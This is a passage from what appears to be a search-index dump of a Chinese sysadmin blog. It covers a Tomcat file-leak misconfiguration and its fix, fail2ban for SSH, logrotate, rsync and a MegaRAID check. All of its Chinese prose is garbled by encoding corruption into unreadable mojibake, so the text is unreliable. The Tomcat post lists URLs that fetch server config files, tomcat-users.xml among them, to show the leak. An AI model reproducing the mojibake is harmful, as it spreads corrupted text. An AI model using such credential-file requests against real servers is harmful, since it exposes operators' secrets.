class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/catalina.policy\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/catalina.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/context.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/logging.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/server.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/tomcat-users.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/web.xml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¿®å¤æ–¹æ³•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå°† /export/servers/tomcat ä¸‹çš„ server.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;Host \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eappBase\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e  æ”¹æˆ  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;Host \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eappBase\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;webapps\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eappBaseåƒä¸‡ä¸èƒ½ä¸ºç©º\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¿®æ”¹å®Œåé‡å¯ç”Ÿæ•ˆ\u003c/p\u003e","title":"Tomcaté…ç½®ä¸å½“å¯¼è‡´æ–‡ä»¶æ³„éœ²"},{"content":"ç”¨fail2banç®€ç®€å•å•å°æ‰sshç«¯å£çš„è¯•æ¢ æœ‰äººä¸åœè¯•æ¢ç™»å½•22ç«¯å£çš„opensshæœåŠ¡ï¼Œipé‡å¾ˆå¤§çš„è¯ï¼Œæ¯”å¦‚1000å¤šipè®ºç•ªæ¥ï¼Œä¼šå¯¼è‡´æœåŠ¡çš„Loadavgå‡é«˜åˆ°7å·¦å³ï¼Œç³»ç»Ÿè¿›ç¨‹å†…sshè¾¾åˆ°1000å¤šï¼Œå¾ˆå›°æ‰°\nå¦‚æœæ”¹æ‰sshdçš„ç¼ºçœç«¯å£22ï¼Œé‚£ä¹ˆscpä»¥åŠsftpçš„æ—¶å€™ä¼šå¸¦æ¥å¾ˆå¤§éº»çƒ¦\nè¿™ç§æƒ…å†µå°±è£…ä¸ªfail2banå°±å¥½ï¼Œæ³¨æ„ï¼ŒCentos 7ç°åœ¨ç”¨çš„æ˜¯fiewalldï¼Œæ‰€ä»¥fail2banå¯ä»¥ç”¨ufwæˆ–è€…iptablesï¼Œå»ºè®®ç”¨iptablesï¼Œæ¯”è¾ƒå®¹æ˜“çœ‹\n#å®‰è£… yum install -y epel-release yum install -y fail2ban æœ€ä¸»è¦çš„å°±æ˜¯ä¿®æ”¹/etc/fail2ban/jail.conf\n#vi /etc/fail2ban/jail.conf ...... [sshd-iptalbes] enabled = true filter = sshd port = 22 action = iptables[name=SSH, port=ssh, protocol=tcp] logpath = /var/log/secure maxretry = 3 bantime = 86400 ...... æ³¨æ„ä¸Šé¢ç”¨çš„æ˜¯iptablesï¼Œä¸‰æ¬¡å°è¯•å¤±è´¥å°±banä¸€å¤©ã€‚\n","permalink":"https://rendoumi.com/posts/20231228-fail2ban/","summary":"\u003ch4 id=\"ç”¨fail2banç®€ç®€å•å•å°æ‰sshç«¯å£çš„è¯•æ¢\"\u003eç”¨fail2banç®€ç®€å•å•å°æ‰sshç«¯å£çš„è¯•æ¢\u003c/h4\u003e\n\u003cp\u003eæœ‰äººä¸åœè¯•æ¢ç™»å½•22ç«¯å£çš„opensshæœåŠ¡ï¼Œipé‡å¾ˆå¤§çš„è¯ï¼Œæ¯”å¦‚1000å¤šipè®ºç•ªæ¥ï¼Œä¼šå¯¼è‡´æœåŠ¡çš„Loadavgå‡é«˜åˆ°7å·¦å³ï¼Œç³»ç»Ÿè¿›ç¨‹å†…sshè¾¾åˆ°1000å¤šï¼Œå¾ˆå›°æ‰°\u003c/p\u003e\n\u003cp\u003eå¦‚æœæ”¹æ‰sshdçš„ç¼ºçœç«¯å£22ï¼Œé‚£ä¹ˆscpä»¥åŠsftpçš„æ—¶å€™ä¼šå¸¦æ¥å¾ˆå¤§éº»çƒ¦\u003c/p\u003e\n\u003cp\u003eè¿™ç§æƒ…å†µå°±è£…ä¸ªfail2banå°±å¥½ï¼Œæ³¨æ„ï¼ŒCentos 7ç°åœ¨ç”¨çš„æ˜¯fiewalldï¼Œæ‰€ä»¥fail2banå¯ä»¥ç”¨ufwæˆ–è€…iptablesï¼Œå»ºè®®ç”¨iptablesï¼Œæ¯”è¾ƒå®¹æ˜“çœ‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å®‰è£…\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y fail2ban\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ€ä¸»è¦çš„å°±æ˜¯ä¿®æ”¹/etc/fail2ban/jail.conf\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#vi /etc/fail2ban/jail.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003esshd-iptalbes\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eenabled\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efilter\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e sshd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eport\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e22\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eaction\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e iptables\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eSSH, \u003cspan class=\"nv\"\u003eport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003essh, \u003cspan class=\"nv\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etcp\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003elogpath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /var/log/secure\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emaxretry\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ebantime\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e86400\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢ç”¨çš„æ˜¯iptablesï¼Œä¸‰æ¬¡å°è¯•å¤±è´¥å°±banä¸€å¤©ã€‚\u003c/p\u003e","title":"ç”¨fail2banç®€ç®€å•å•å°æ‰sshç«¯å£çš„è¯•æ¢"},{"content":"ç”¨logrotateè§£å†³catalinna.outè¿‡å¤§çš„é—®é¢˜ æˆ‘ä»¬çš„tomcatçš„catalina.outåŸºæœ¬è¿è¡Œä¸€æ®µæ—¶é—´åä¼šå‡ºç°æ–‡ä»¶è¿‡å¤§çš„é—®é¢˜ï¼Œå¤„ç†ä¸€ä¸‹ã€‚\nå‰ææ˜¯/export/servers/tomcat/ä¸‹éœ€è¦å»ºç«‹ä¸ªè½¯é“¾æ¥tomcatï¼ŒæŒ‡å‘ç°åœ¨æ­£åœ¨ç”¨çš„tomcatç‰ˆæœ¬\nç„¶åå°±å¯ä»¥ç”¨logrotateæ¥è§£å†³catalina.outçš„æ—¥å¿—è½®è½¬é—®é¢˜ã€‚è¿™ç§æ–¹å¼æ¯”è¾ƒç®€å•ã€‚åœ¨/etc/logrotate.d/ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåä¸ºtomcatçš„æ–‡ä»¶ï¼Œ\ncat \u0026gt;/etc/logrotate.d/tomcat \u0026lt;\u0026lt;EOF /export/servers/tomcat/tomcat/logs/catalina.out{ copytruncate daily rotate 7 missingok compress } EOF ä»¥ä¸Šçš„é…ç½®è¯´æ˜ï¼š\n/export/servers/tomcat/tomcat/logs/catalina.out{ # è¦è½®è½¬çš„æ–‡ä»¶ copytruncate # åˆ›å»ºæ–°çš„catalina.outå‰¯æœ¬åï¼Œtruncateæºcatalina.outæ–‡ä»¶ï¼Œä¼šä¸¢æ•°æ®!!! daily # æ¯å¤©è¿›è¡Œcatalina.outæ–‡ä»¶çš„è½®è½¬ rotate 7 # è‡³å¤šä¿ç•™7ä¸ªå‰¯æœ¬ missingok # å¦‚æœè¦è½®è½¬çš„æ–‡ä»¶ä¸¢å¤±äº†ï¼Œç»§ç»­è½®è½¬è€Œä¸æŠ¥é”™ compress # ä½¿ç”¨å‹ç¼©çš„æ–¹å¼ï¼ˆéå¸¸æœ‰ç”¨ï¼ŒèŠ‚çœç¡¬ç›˜ç©ºé—´ï¼›ä¸€ä¸ª2~3GBçš„æ—¥å¿—æ–‡ä»¶å¯ä»¥å‹ç¼©æˆ60MBå·¦å³ï¼‰ }\nå¯ä»¥æ‰‹å·¥å¼ºåˆ¶æ‰§è¡Œlogrotateç¨‹åºã€‚åœ¨å‘½ä»¤è¡Œè¿è¡Œï¼š\n","permalink":"https://rendoumi.com/posts/20231228-logrotate/","summary":"\u003ch4 id=\"ç”¨logrotateè§£å†³catalinnaoutè¿‡å¤§çš„é—®é¢˜\"\u003eç”¨logrotateè§£å†³catalinna.outè¿‡å¤§çš„é—®é¢˜\u003c/h4\u003e\n\u003cp\u003eæˆ‘ä»¬çš„tomcatçš„catalina.outåŸºæœ¬è¿è¡Œä¸€æ®µæ—¶é—´åä¼šå‡ºç°æ–‡ä»¶è¿‡å¤§çš„é—®é¢˜ï¼Œå¤„ç†ä¸€ä¸‹ã€‚\u003c/p\u003e\n\u003cp\u003eå‰ææ˜¯/export/servers/tomcat/ä¸‹éœ€è¦å»ºç«‹ä¸ªè½¯é“¾æ¥tomcatï¼ŒæŒ‡å‘ç°åœ¨æ­£åœ¨ç”¨çš„tomcatç‰ˆæœ¬\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231228-logrotate/2021-06-18_110807.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åå°±å¯ä»¥ç”¨logrotateæ¥è§£å†³catalina.outçš„æ—¥å¿—è½®è½¬é—®é¢˜ã€‚è¿™ç§æ–¹å¼æ¯”è¾ƒç®€å•ã€‚åœ¨/etc/logrotate.d/ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåä¸ºtomcatçš„æ–‡ä»¶ï¼Œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u0026gt;/etc/logrotate.d/tomcat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/export/servers/tomcat/tomcat/logs/catalina.out{\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    copytruncate\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    daily\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    rotate 7\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    missingok\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    compress\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»¥ä¸Šçš„é…ç½®è¯´æ˜ï¼š\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e/export/servers/tomcat/tomcat/logs/catalina.out{ # è¦è½®è½¬çš„æ–‡ä»¶\ncopytruncate  # åˆ›å»ºæ–°çš„catalina.outå‰¯æœ¬åï¼Œtruncateæºcatalina.outæ–‡ä»¶ï¼Œä¼šä¸¢æ•°æ®!!!\ndaily     # æ¯å¤©è¿›è¡Œcatalina.outæ–‡ä»¶çš„è½®è½¬\nrotate 7   # è‡³å¤šä¿ç•™7ä¸ªå‰¯æœ¬\nmissingok   # å¦‚æœè¦è½®è½¬çš„æ–‡ä»¶ä¸¢å¤±äº†ï¼Œç»§ç»­è½®è½¬è€Œä¸æŠ¥é”™\ncompress   # ä½¿ç”¨å‹ç¼©çš„æ–¹å¼ï¼ˆéå¸¸æœ‰ç”¨ï¼ŒèŠ‚çœç¡¬ç›˜ç©ºé—´ï¼›ä¸€ä¸ª2~3GBçš„æ—¥å¿—æ–‡ä»¶å¯ä»¥å‹ç¼©æˆ60MBå·¦å³ï¼‰\n}\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eå¯ä»¥æ‰‹å·¥å¼ºåˆ¶æ‰§è¡Œlogrotateç¨‹åºã€‚åœ¨å‘½ä»¤è¡Œè¿è¡Œï¼š\u003c/p\u003e","title":"ç”¨logrotateè§£å†³catalinna.outè¿‡å¤§çš„é—®é¢˜"},{"content":"Rsyncçš„åŸºæœ¬å‚æ•° -a : å½’æ¡£æ¨¡å¼ï¼Œé€’å½’æ‹·è´ï¼Œå¸¦å±æ€§ã€‚ -u : åŒæ­¥æ—¶ç›®æ ‡ç›®å½•ä¸­å¦‚æœæŸæ–‡ä»¶æ¯”æºä¸­æ–‡ä»¶æ—¶é—´è¦æ–°ï¼Œåˆ™ä¿ç•™ä¸åŠ¨ã€‚ -v : è¯¦ç»†æ˜¾ç¤ºä¿¡æ¯ -z : å‹ç¼© -h : æ˜¾ç¤ºå‹å¥½ä¿¡æ¯ -P : æ˜¾ç¤ºä¼ è¾“è¿›åº¦ç™¾åˆ†æ¯” -R : ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œä¼šä¿ç•™æºç›®å½•çš„ç›®å½•ç»“æ„ã€‚ -e : ä½¿ç”¨sshæ¥ä¼ è¾“ æºå¦‚æœæ²¡æœ‰/ï¼Œä»£è¡¨è¿åŒç›®å½•ä»¥åŠç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç»Ÿç»Ÿæ‹·è´åˆ°ç›®çš„å» æºå¦‚æœæœ€åå¸¦/ï¼Œæ„æ€æ˜¯/*ï¼Œä»£è¡¨åªæ‹·è´ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¸åŒ…æ‹¬ç›®å½•æœ¬èº« å¦‚æœå‚æ•°ä¸­å¸¦-Rï¼Œé‚£æ— è®ºæºåé¢æœ‰æ— /ï¼Œéƒ½æŒ‰åŸæœ‰ç›®å½•çŠ¶æ€æ‹·è¿‡å» -R ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œä¼šä¿ç•™æºç›®å½•çš„ç›®å½•ç»“æ„ã€‚ å¦‚rsync -av /foo/bar/baz.c remote::/tmp/ï¼Œä¼šå°†baz.cä¼ åˆ°/tmpä¸‹ï¼Œ è€Œä½¿ç”¨äº†-Rï¼Œåˆ™åœ¨/tmpä¸‹çš„æ–‡ä»¶ç»“æ„å°†ä¼šæ˜¯foo/bar/baz.cã€‚\nä¸‹é¢ä¸¤ç§ç”¨æ³•ä¸€æ ·ï¼š\nrsync -auvPR --exclude \u0026#39;upload\u0026#39; new 172.18.34.38::new/ rsync -auvPR --exclude \u0026#39;upload\u0026#39; ./new 172.18.34.38::new/ å¤§è§„æ¨¡ä¼ è¾“ç»†å°æ–‡ä»¶çš„æ–¹æ³•ï¼š find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -P 30 -n 60 -I % -0 rsync -auvPR % 172.18.34.38::new/ -print0 -0 findå‘½ä»¤æœ‰ä¸€ä¸ªç‰¹åˆ«çš„å‚æ•°-print0ï¼ŒæŒ‡å®šè¾“å‡ºçš„æ–‡ä»¶åˆ—è¡¨ä»¥nullåˆ†éš”ã€‚ç„¶åï¼Œxargså‘½ä»¤çš„-0å‚æ•°è¡¨ç¤ºç”¨nullå½“ä½œåˆ†éš”ç¬¦ã€‚ -I -IæŒ‡å®šæ¯ä¸€é¡¹å‘½ä»¤è¡Œå‚æ•°çš„æ›¿ä»£å­—ç¬¦ä¸²ã€‚\næ³¨æ„ä¸Šé¢ï¼Œä»æœ€åº•å±‚å¼€å§‹ï¼Œé€æ­¥å‘ä¸ŠåŒæ­¥ã€‚åŒæ­¥å®Œç¬¬6ä¸ªï¼Œç„¶åç¬¬5ä¸ªï¼Œ4 3 2 1 \u0026hellip;\u0026hellip;\næœ€ä½çš„æ˜¯ç¬¬6å±‚ï¼Œæ¯ä¸ªæ–‡ä»¶ä»·æ˜¯ä¸€ä¸ªæ—¥æœŸï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹åŒ…å«3000ä¸ªæ–‡ä»¶å·¦å³ã€‚\né™é€Ÿ rsync --bwlimit=500 bwlimitçš„å•ä½æ˜¯kbï¼Œæ‰€ä»¥500Ã—8=4000kb=4000000ï¼Œé™é€Ÿæ˜¯4Mï¼ˆç½‘ç»œå•ä½ï¼‰\nå€Ÿç”¨ssh rsync -avzhe ssh backup.tar root@192.168.0.100:/backups/ ","permalink":"https://rendoumi.com/posts/20231228-rsync/","summary":"\u003ch4 id=\"rsyncçš„åŸºæœ¬å‚æ•°\"\u003eRsyncçš„åŸºæœ¬å‚æ•°\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-a : å½’æ¡£æ¨¡å¼ï¼Œé€’å½’æ‹·è´ï¼Œå¸¦å±æ€§ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-u : åŒæ­¥æ—¶ç›®æ ‡ç›®å½•ä¸­å¦‚æœæŸæ–‡ä»¶æ¯”æºä¸­æ–‡ä»¶æ—¶é—´è¦æ–°ï¼Œåˆ™ä¿ç•™ä¸åŠ¨ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-v : è¯¦ç»†æ˜¾ç¤ºä¿¡æ¯\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-z : å‹ç¼©\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-h : æ˜¾ç¤ºå‹å¥½ä¿¡æ¯\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-P : æ˜¾ç¤ºä¼ è¾“è¿›åº¦ç™¾åˆ†æ¯”\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-R : ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œä¼šä¿ç•™æºç›®å½•çš„ç›®å½•ç»“æ„ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-e : ä½¿ç”¨sshæ¥ä¼ è¾“\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  æºå¦‚æœæ²¡æœ‰/ï¼Œä»£è¡¨è¿åŒç›®å½•ä»¥åŠç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç»Ÿç»Ÿæ‹·è´åˆ°ç›®çš„å»\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  æºå¦‚æœæœ€åå¸¦/ï¼Œæ„æ€æ˜¯/*ï¼Œä»£è¡¨åªæ‹·è´ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¸åŒ…æ‹¬ç›®å½•æœ¬èº«\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  å¦‚æœå‚æ•°ä¸­å¸¦-Rï¼Œé‚£æ— è®ºæºåé¢æœ‰æ— /ï¼Œéƒ½æŒ‰åŸæœ‰ç›®å½•çŠ¶æ€æ‹·è¿‡å»\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cblockquote\u003e\n\u003cp\u003e-R ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œä¼šä¿ç•™æºç›®å½•çš„ç›®å½•ç»“æ„ã€‚\nå¦‚rsync -av /foo/bar/baz.c remote::/tmp/ï¼Œä¼šå°†baz.cä¼ åˆ°/tmpä¸‹ï¼Œ\nè€Œä½¿ç”¨äº†-Rï¼Œåˆ™åœ¨/tmpä¸‹çš„æ–‡ä»¶ç»“æ„å°†ä¼šæ˜¯foo/bar/baz.cã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eä¸‹é¢ä¸¤ç§ç”¨æ³•ä¸€æ ·ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ersync -auvPR --exclude \u003cspan class=\"s1\"\u003e\u0026#39;upload\u0026#39;\u003c/span\u003e new 172.18.34.38::new/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ersync -auvPR --exclude \u003cspan class=\"s1\"\u003e\u0026#39;upload\u0026#39;\u003c/span\u003e ./new 172.18.34.38::new/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"å¤§è§„æ¨¡ä¼ è¾“ç»†å°æ–‡ä»¶çš„æ–¹æ³•\"\u003eå¤§è§„æ¨¡ä¼ è¾“ç»†å°æ–‡ä»¶çš„æ–¹æ³•ï¼š\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind ./new -mindepth \u003cspan class=\"m\"\u003e6\u003c/span\u003e -maxdepth \u003cspan class=\"m\"\u003e6\u003c/span\u003e -type d -print0 \u003cspan class=\"p\"\u003e|\u003c/span\u003e xargs -P \u003cspan class=\"m\"\u003e30\u003c/span\u003e -n \u003cspan class=\"m\"\u003e60\u003c/span\u003e -I % -0 rsync -auvPR % 172.18.34.38::new/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cblockquote\u003e\n\u003cp\u003e-print0 -0 findå‘½ä»¤æœ‰ä¸€ä¸ªç‰¹åˆ«çš„å‚æ•°-print0ï¼ŒæŒ‡å®šè¾“å‡ºçš„æ–‡ä»¶åˆ—è¡¨ä»¥nullåˆ†éš”ã€‚ç„¶åï¼Œxargså‘½ä»¤çš„-0å‚æ•°è¡¨ç¤ºç”¨nullå½“ä½œåˆ†éš”ç¬¦ã€‚\n-I -IæŒ‡å®šæ¯ä¸€é¡¹å‘½ä»¤è¡Œå‚æ•°çš„æ›¿ä»£å­—ç¬¦ä¸²ã€‚\u003c/p\u003e","title":"Rsyncçš„æ—¥å¸¸ä½¿ç”¨æ–¹æ³•"},{"content":"192.168.85.7ä¸Šé¢æœ‰ä¸¤ä¸ªRaid\nä¸€ä¸ªRaid1, 500Gï¼Œåº”è¯¥æ˜¯ä¸¤å—ç›˜ï¼Œç°åœ¨ä¸¢äº†ä¸€å—ï¼Œæ­£ç¡®çš„æ§½ä½ä¸çŸ¥é“æ˜¯å“ªä¸€ä¸ª å¦ä¸€ä¸ªæ˜¯Raid0ï¼Œ4TBï¼Œè¿è¡Œæ­£å¸¸\nç°åœ¨åœ¨ä¸€ä¸ªæ–°æ§½ä½ä¸Šæ’äº†ä¸€å—ç¡¬ç›˜ï¼Œä½†æ˜¯æ§½ä½ä¸å¯¹ï¼Œæ²¡æœ‰è‡ªåŠ¨rebuildï¼ŒçŠ¶æ€æ˜¯unconfiged good.\né¦–å…ˆæŸ¥ä¸€ä¸‹ä¸¢å¤±çš„ç›˜\n/opt/MegaRAID/MegaCli/MegaCli64 -Pdgetmissing -a0\rå¾—åˆ°å‚æ•°Array 0ï¼ŒRow 